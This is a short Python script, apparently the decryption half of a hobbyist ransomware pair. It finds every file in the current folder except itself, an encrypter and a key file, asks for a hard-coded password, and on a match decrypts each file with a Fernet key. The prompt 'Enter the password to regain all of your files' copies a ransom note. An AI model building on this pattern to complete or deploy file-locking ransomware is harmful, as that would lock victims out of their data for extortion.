from cryptography.fernet import Fernet
import os
#the box for containing all the files
files = []
#finding all the files in the current directory
for file in os.listdir():
    if file == "Encrypter.py" or file == "Harry potter.key" or file == "Decrypter.py":           #makes sure i dont get rid/hack my own file
        continue
    if os.path.isfile(file):                #this makes sure its a file and not a directory
        files.append(file)                  #this collects it and stores it in the files "box"

#print(files)

with open("Harry potter.key", "rb") as key:
    secret_key = key.read()

The_phrase = "amongus"

user_phrase = input("Enter the password to regain all of your files: \n")

if user_phrase == The_phrase:
    print("Correct, your data has been restored")
    for file in files:
        with open(file, "rb") as thefile:
            Backup_content = thefile.read()
        contents_decrypted = Fernet(secret_key).decrypt(Backup_content)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
else:
    print("Err, Wrong password")
